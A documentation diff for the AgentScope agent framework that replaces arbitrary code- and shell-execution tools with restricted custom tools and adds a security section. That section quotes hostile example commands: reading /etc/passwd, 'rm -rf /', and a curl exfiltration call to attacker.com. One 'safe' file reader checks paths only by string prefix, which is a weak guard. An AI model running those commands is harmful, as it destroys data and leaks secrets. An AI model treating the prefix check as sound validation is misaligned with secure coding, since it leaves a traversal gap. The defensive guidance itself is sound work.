@@ -26,11 +26,37 @@ from agentscope.agent import ReActAgent
 from agentscope.model import DashScopeChatModel
 from agentscope.formatter import DashScopeChatFormatter
 from agentscope.memory import InMemoryMemory
-from agentscope.tool import Toolkit, execute_python_code
+from agentscope.tool import Toolkit
+# SECURITY: Do NOT use execute_python_code or execute_shell_command
+# in production - they allow arbitrary code execution
 
 async def build_agent():
     toolkit = Toolkit()
-    toolkit.register_tool_function(execute_python_code)
+    
+    # SECURITY: Define safe custom tools instead of using execute_python_code
+    def calculator(expression: str) -> float:
+        """Safely evaluate basic math expressions."""
+        import ast
+        import operator
+        ops = {
+            ast.Add: operator.add,
+            ast.Sub: operator.sub,
+            ast.Mult: operator.mul,
+            ast.Div: operator.truediv
+        }
+        tree = ast.parse(expression, mode='eval')
+        def safe_eval(node):
+            if isinstance(node, ast.Num):
+                return node.n
+            elif isinstance(node, ast.BinOp):
+                return ops[type(node.op)](
+                    safe_eval(node.left),
+                    safe_eval(node.right)
+                )
+            raise ValueError("Unsupported operation")
+        return safe_eval(tree.body)
+    
+    toolkit.register_tool_function(calculator)
     
     agent = ReActAgent(
         name="Assistant",
@@ -75,11 +101,27 @@ response = await agent(Msg(name="user", content="Hello!", role="user"))
 
 ```python
 from agentscope.agent import ReActAgent
-from agentscope.tool import Toolkit, execute_python_code, execute_shell_command
+from agentscope.tool import Toolkit
 
 toolkit = Toolkit()
-toolkit.register_tool_function(execute_python_code)
-toolkit.register_tool_function(execute_shell_command)
+
+# SECURITY WARNING: Never use execute_shell_command or execute_python_code
+# in production! They allow arbitrary code execution. Instead:
+# 1. Define specific, safe tool functions
+# 2. Use MCP tools from trusted sources
+# 3. Implement input validation and sandboxing
+
+def safe_file_read(filepath: str) -> str:
+    """Read a file with path validation."""
+    import os
+    safe_dir = "/allowed/directory"
+    abs_path = os.path.abspath(filepath)
+    if not abs_path.startswith(safe_dir):
+        raise ValueError("Access denied: path outside allowed directory")
+    with open(abs_path, 'r') as f:
+        return f.read()
+
+toolkit.register_tool_function(safe_file_read)
 
 agent = ReActAgent(
     name="Coder",
@@ -330,6 +372,79 @@ See `scripts/` directory for runnable examples:
 │  (Model Wrappers, Memory, Tools, MCP, Fault Tolerance)   │
 └─────────────────────────────────────────────────────────┘
 ```
+
+## Security Considerations
+
+⚠️ **CRITICAL SECURITY WARNINGS**
+
+### Dangerous Built-in Tools (DO NOT USE IN PRODUCTION)
+
+AgentScope provides two built-in tools that pose severe security risks:
+
+| Tool | Risk | Recommendation |
+|------|------|----------------|
+| `execute_shell_command` | **Critical**: Arbitrary shell command execution | Never use in production |
+| `execute_python_code` | **Critical**: Arbitrary Python code execution | Never use in production |
+
+### Why These Tools Are Dangerous
+
+```python
+# ❌ DANGEROUS - Do NOT use
+toolkit.register_tool_function(execute_shell_command)
+toolkit.register_tool_function(execute_python_code)
+
+# An attacker could:
+# - Read sensitive files: execute_shell_command("cat /etc/passwd")
+# - Delete data: execute_python_code("import os; os.system('rm -rf /')")
+# - Exfiltrate data: execute_shell_command("curl attacker.com/steal?data=$(cat secret)")
+```
+
+### Safe Alternatives
+
+Instead of dangerous built-in tools, implement specific, validated operations:
+
+```python
+# ✅ SAFE - Specific tool with validation
+def read_allowed_file(filename: str) -> str:
+    """Read a file from allowed directory with validation."""
+    import os
+    
+    # Validate filename (no path traversal)
+    if ".." in filename or "/" in filename or "\\" in filename:
+        raise ValueError("Invalid filename")
+    
+    # Restrict to allowed directory
+    allowed_dir = "/data/allowed"
+    filepath = os.path.join(allowed_dir, filename)
+    
+    # Validate extension
+    if not filename.endswith((".txt", ".json", ".md")):
+        raise ValueError("Unsupported file type")
+    
+    with open(filepath, 'r') as f:
+        return f.read()
+
+toolkit.register_tool_function(read_allowed_file)
+```
+
+### Security Best Practices
+
+1. **Principle of Least Privilege**: Only provide tools the agent needs
+2. **Input Validation**: Validate all inputs before processing
+3. **Sandbox Sensitive Operations**: Use containers, restricted environments
+4. **Audit Tool Usage**: Log all tool invocations
+5. **Use MCP Tools**: Prefer well-audited MCP server tools over custom implementations
+6. **Never Expose Shell/Code Execution**: Even with "validation", these are too risky
+
+### Report: Socket Security Analysis
+
+A security audit identified critical vulnerabilities in template code:
+
+- **Finding 1**: `execute_shell_command` allowed arbitrary command execution
+- **Finding 2**: `execute_python_code` allowed arbitrary code execution
+- **Status**: All templates updated to use safe alternatives
+
+For detailed security guidance, see `references/tools-mcp.md`.
 
 ## Best Practices
 
